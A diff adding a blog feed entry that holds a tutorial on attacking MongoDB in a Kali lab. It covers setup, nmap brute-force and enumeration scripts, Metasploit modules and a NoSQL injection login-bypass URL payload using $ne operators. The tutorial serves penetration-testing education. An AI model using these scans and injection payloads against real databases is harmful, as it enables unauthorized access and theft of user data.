@@ -7,6 +7,317 @@
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Hacking_mongodb</title>
+        <description>&lt;h1&gt;Mongodb Hacking&lt;/h1&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;1. Introduction and Lab Setup.
+   1.1 What is MongoDB ?
+   1.2 How about Security ?
+   1.3 Installing MongoDB in Kali
+   1.4 Playing with Mongo Shell
+       1.4.1 Creating a database
+       1.4.2 Checking current database
+       1.4.3 Checking the list of databases
+       1.4.4 Inserting data into collections
+       1.4.5 Querying a document
+       1.4.6 Writing Conditions while querying data
+       1.4.7 Deleting Documents
+       1.4.8 Dropping a collection
+       1.4.9 Dropping a database
+   1.5 Lab Setup
+
+2. Vulnerability Assessment
+   2.1 Introduction
+   2.2 Scanning for open ports
+   2.3 Service enumeration
+   2.4 Scanning for http-interface
+   2.5 Accessing HTTP Interface
+   2.6 Scanning with nmap NSE scripts
+   2.7 mongodb-brute
+   2.8 mongodb-databases
+   2.9 Metasploit Auxiliary Module
+   2.10 Exploitation
+
+3. Attacking Applications
+   3.1 Introduction
+
+4. Automated Assessments
+   4.1 Getting NoSQLMap ready
+   4.2 NoSQL DB Access Attacks
+   4.3 Scanning for anonymous MongoDB access
+   4.4 NoSQL Injection using NoSQLMao
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h2&gt;Introduction and Lab Setup&lt;/h2&gt;
+
+&lt;h3&gt;What is Mongodb?&lt;/h3&gt;
+
+&lt;p&gt;MongoDB is an open source schema less document oriented database system developed using C++. MongoDB is one of the leading NoSQL database solutions.  &lt;/p&gt;
+
+&lt;p&gt;In MongoDB, data is stored in the form of JSON style document.  &lt;/p&gt;
+
+&lt;p&gt;Some of the major features of MongoDB:  &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Document Based&lt;/li&gt;
+&lt;li&gt;High performance&lt;/li&gt;
+&lt;li&gt;HIgh Availability&lt;/li&gt;
+&lt;li&gt;Easy Scalability&lt;/li&gt;
+&lt;li&gt;No Complex Joins&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;How about Security?&lt;/h3&gt;
+
+&lt;p&gt;With the growing use of NoSQL databases, security should be considered seriously. Just like any other system, the security of MongoDB is not a single-handed job. Everyone in the ecosystem is responsible for it. Even through MongoDB comes with some inbuilt security features, it is possible to have vulnerabilities in the production due to various reasons such as misconfigurations, no updates, poor programming etc.&lt;/p&gt;
+
+&lt;h3&gt;Installing MongoDB in Kali&lt;/h3&gt;
+
+&lt;p&gt;Run the sudo apt-get update command.  &lt;/p&gt;
+
+&lt;p&gt;This command downloads the package lists from the repositories and updates them to get information on the newest version of the packages and their dependencies.&lt;/p&gt;
+
+&lt;p&gt;This step may take some time and provides a large output on the screen, so the output is truncated.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# apt-get install mongodb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Create a directory &amp;ldquo;/data/db&amp;rdquo; under root folder. Make sure that &amp;ldquo;/data/db&amp;rdquo; is dieectly under the &amp;ldquo;/&amp;rdquo; root directory, we need to create this directory as root.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mkdir -p /data/db
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Once we have completed the previous steps, we can start  a MongoDB instance with the following command:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# service mongodb start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This will start the MongoDB instance with the default features. After lanuching the MongoDB instance, we cross check to see if it is up and running by locking at the console messages.  &lt;/p&gt;
+
+&lt;p&gt;If we see the message below in the console, it is running fine.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# service mongodb status
+[ ok ] Checking status of database: mongodb running.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Note: As mentioned earlier, MongoDB by default runs with limited features. For peneration testing lab purposes, use the following steps to start the MongoDB instance.  &lt;/p&gt;
+
+&lt;p&gt;Launch MongoDB with the following command  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mongod -httpinterface -reset -smallfiles
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;run the following command to connect to the mongod server, which is started already.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;root:~ /# mongo
+MongoDB shell version: 2.0.6
+connecting to: test
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Note: if you get any erros, please solve the problem yourself, and everything should work fine.  &lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt;Playing with Mongo Shell&lt;/h3&gt;
+
+&lt;p&gt;In the previous sections, we have seen a brief introduction to MongoDB and its setup. It&amp;rsquo;s time to play with the shell and execute few commands on the MongoDB to get better accquainted with MongoDB and its working.  &lt;/p&gt;
+
+&lt;p&gt;MongoDB uses Javascript style queries and thus we feel like running Javascript code most of the time.  &lt;/p&gt;
+
+&lt;p&gt;Though we don&amp;rsquo;t discuss all the commands associated with MongoDB, this section gives a brief idea of how MongoDB works.  &lt;/p&gt;
+
+&lt;p&gt;Before we proceed, there are few terms to understand.  &lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;MongoDB holds &amp;ldquo;databases&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;Each database contains one or more &amp;ldquo;collections&amp;rdquo;.&lt;/li&gt;
+&lt;li&gt;Each collection holds one or more &amp;ldquo;documents:.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now, let&amp;rsquo;s proceed to run the MongoDB commands&lt;/p&gt;
+
+&lt;h4&gt;Creating a database&lt;/h4&gt;
+
+&lt;p&gt;The following command will create a new database if doesn&amp;rsquo;t exist. If the database already exists, it uses it.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s create a database with the name &amp;quot;testdb&amp;rdquo;.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show dbs
+customers   (empty)
+local   (empty)
+sample  0.0625GB
+shop    (empty)
+test    (empty)
+&amp;gt; use sample
+switched to db sample
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Checking current database&lt;/h4&gt;
+
+&lt;p&gt;We can use the command &amp;ldquo;db&amp;rdquo; to check the current database. Let;s run the command &amp;ldquo;db&amp;rdquo; to check the current database. &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db
+sample
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Checking the list of databases&lt;/h4&gt;
+
+&lt;p&gt;&amp;ldquo;show dbs&amp;rdquo; is the command to list the databases available.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show dbs                                                
+customers   (empty)                                       
+local   (empty)                                           
+sample  0.0625GB                                          
+shop    (empty)                                           
+test    (empty) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you notice the above output, it didn&amp;rsquo;t list the database we just created.  &lt;/p&gt;
+
+&lt;p&gt;The reason is that it requires at least one document inside it.&lt;/p&gt;
+
+&lt;h4&gt;Inserting data into collections&lt;/h4&gt;
+
+&lt;p&gt;If we insert one or more documents inside it, we can see the database listed.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;superman&amp;quot;})
+&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;spiderman&amp;quot;})
+&amp;gt; db.demo.insert({&amp;quot;username&amp;quot;:&amp;quot;flashman&amp;quot;})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;By default, we don&amp;rsquo;t need to explicitly create collections in a database (We can do so if we want). We can directly use a non-existent collection name to insert data. MongoDB will automaticallly create it.&lt;/p&gt;
+
+&lt;p&gt;If we now list databases, we can see our current databases.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; show collections
+demo
+products
+system.indexes
+users
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Querying a document&lt;/h4&gt;
+
+&lt;p&gt;In order to query data from a MongoDB collection, we can use find() method as shown below.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find()
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de64b497930a32f3446&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;flashman&amp;quot; }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Writing Conditions while querying data&lt;/h4&gt;
+
+&lt;p&gt;We can also write conditions on queries similar to RDBMS conditions with MongoDB specfic syntax.&lt;br&gt;
+Currently, my collection has two documents.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find()
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de64b497930a32f3446&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;flashman&amp;quot; }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If I want to retrieve only one document based on matching a specific username, we can do it as shown below. &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.find({&amp;quot;username&amp;quot;:&amp;quot;spiderman&amp;quot;})
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Deleting Documents&lt;/h4&gt;
+
+&lt;p&gt;We can use remove() method to delete documents from a collection based on a specific condition.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.remove({&amp;quot;username&amp;quot;: &amp;quot;flashman&amp;quot;})
+&amp;gt; db.demo.find()
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69dda4b497930a32f3444&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;superman&amp;quot; }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d69de14b497930a32f3445&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;spiderman&amp;quot; }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The above query removes the document where the key &amp;ldquo;username&amp;rdquo; has the value &amp;ldquo;flashman&amp;rdquo;.&lt;/p&gt;
+
+&lt;h4&gt;Dropping a collection&lt;/h4&gt;
+
+&lt;p&gt;We can drop a collection as shown below.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.demo.drop()
+true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Droppong a database&lt;/h4&gt;
+
+&lt;p&gt;We can drpo a database as shown below.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.dropDatabase()
+{ &amp;quot;dropped&amp;quot; : &amp;quot;sample&amp;quot;, &amp;quot;ok&amp;quot; : 1 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The above command has dropped the database &amp;lsquo;sample&amp;rsquo; that we created.  &lt;/p&gt;
+
+&lt;p&gt;This is how we can run commands on MongoDB using a mongo shell.  &lt;/p&gt;
+
+&lt;p&gt;The idea behind showing these commands is not to make you a MongoDB master, but to give a basic idea of how MongoDB functions if you are an absolute beginner.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt;Lab Setup&lt;/h3&gt;
+
+&lt;p&gt;We need to have the following setup to follow the practical demonstrations shown in this book.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;             ----------------
+             |              |
+             |     Kali     |
+             |              |
+             |   [MongoDB]  |
+             |              |
+             ----------------
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;As we can see in the above figure, we need to install Kali Linux. Make sure that you have &amp;ldquo;Host Only Adapter&amp;rdquo; under adapter 1 of your network settings for both the machines as shown below.&lt;/p&gt;
+
+&lt;p&gt;Note: We will also setup a PHP Web Application later in this section. So, please use the same names as I am using to create database and collections. It is required for the PHP Web application to work. If you change these names, you may need to change the PHP web application accordingly.  &lt;/p&gt;
+
+&lt;h4&gt;Create a new database&lt;/h4&gt;
+
+&lt;p&gt;Get the mongo shell and create a new database called &amp;ldquo;sample&amp;rdquo; by running the following command in the mongo shell.  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; use sample
+switched to db sample
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This command will switch the user to the database &amp;ldquo;sample&amp;rdquo; if it already exists. If the database doesn&amp;rsquo;t exist, it will create a new one.&lt;/p&gt;
+
+&lt;h4&gt;Insert data&lt;/h4&gt;
+
+&lt;p&gt;Run the following command in mongo shell in order to insert test data into the collection &amp;ldquo;users&amp;rdquo;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;tom&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;tom&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 12345})
+&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 54321})
+&amp;gt; db.users.insert({&amp;quot;username&amp;quot;: &amp;quot;bob&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;bob&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot;: 22222})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Similarly execute the following commands&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;laptop&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;1500USC&amp;quot;})
+&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;book&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;50USC&amp;quot;})
+&amp;gt; db.products.insert({&amp;quot;email&amp;quot;: &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;prodname&amp;quot;: &amp;quot;diamondring&amp;quot;, &amp;quot;price&amp;quot;: &amp;quot;4500USC&amp;quot;})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Installing the PHP driver for mongo&lt;/h4&gt;
+
+&lt;p&gt;In order for the PHP web application to work with MongoDB, we need to install the PHP driver.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;sudo apt-get install php-pear php5-dev
+sudo pecl install mongo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h4&gt;Installing PHP Web application&lt;/h4&gt;
+
+&lt;p&gt;Once after done with the installation of PHP driver, we need to install the PHP web application. Download the PHP code from HERE.  &lt;/p&gt;
+
+&lt;p&gt;This files is named as mongo.zip and looks as shown below.  &lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2&gt;Vulnerability Assessment&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;nmap -p 27017 &amp;lt;ipaddress&amp;gt;
+nmap -p 27017 -sV &amp;lt;ipaddress&amp;gt;
+nmap -p 27017 --script mongodb-brute &amp;lt;ipadress&amp;gt;
+nmap -p 27017 --script mongodb-databases &amp;lt;ipaddress&amp;gt;
+
+msf &amp;gt; use auxiliary/scanner/mongodb/mongodb_login
+msf &amp;gt; use auxiliary/gather/mongodb_js_inject_collection_enum
+msf &amp;gt; use exploit/linux/misc/mongod_native_helper
+
+nmap -p 28017 &amp;lt;ipaddress&amp;gt;
+nmap -p 28017 -sV &amp;lt;ipaddress&amp;gt;
+
+http://&amp;lt;ipaddress&amp;gt;:28017/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h2&gt;Attacking Applications&lt;/h2&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.find({&amp;quot;username&amp;quot;:&amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}})
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d719d60515e316247247&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 54321 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you notice, the above MongoDB command is fetching all the documents where the username is &amp;ldquo;jim&amp;rdquo; and password not equals to &amp;ldquo;0x00&amp;rdquo;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; db.users.find({&amp;quot;username&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}, &amp;quot;password&amp;quot;: {$ne: &amp;quot;0x00&amp;quot;}})
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d6f2d60515e316247246&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;tom&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;tom&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;tom@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 12345 }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d719d60515e316247247&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;jim&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;jim@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 54321 }
+{ &amp;quot;_id&amp;quot; : ObjectId(&amp;quot;55d5d739d60515e316247248&amp;quot;), &amp;quot;username&amp;quot; : &amp;quot;bob&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;bob&amp;quot;, &amp;quot;email&amp;quot; : &amp;quot;bob@gmail.com&amp;quot;, &amp;quot;cardnumber&amp;quot; : 22222 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;This time, we are able to see all the documents that do not meet the condition username and password as &amp;ldquo;jim&amp;rdquo;.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;text language-text&quot; data-lang=&quot;text&quot;&gt;http://localhost/index.php?username[$ne]=test&amp;amp;password[$ne]=test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;h2&gt;Automated Assessments&lt;/h2&gt;
+
+&lt;p&gt;We are going to use a very nice tool called NoSQLMap for this part.&lt;/p&gt;
+
+&lt;p&gt;http://github.com/tcstool/nosqlmap&lt;/p&gt;
+</description>
+        <pubDate>Sun, 20 Sep 2015 00:00:00 +0000</pubDate>
+        <link>/2015/09/20/hacking_mongodb/</link>
+        <guid isPermaLink="true">/2015/09/20/hacking_mongodb/</guid>
+      </item>
+    
+      <item>
         <title>Flick_1_workthrough</title>
         <description>&lt;h1&gt;Flick: 1&lt;/h1&gt;
 
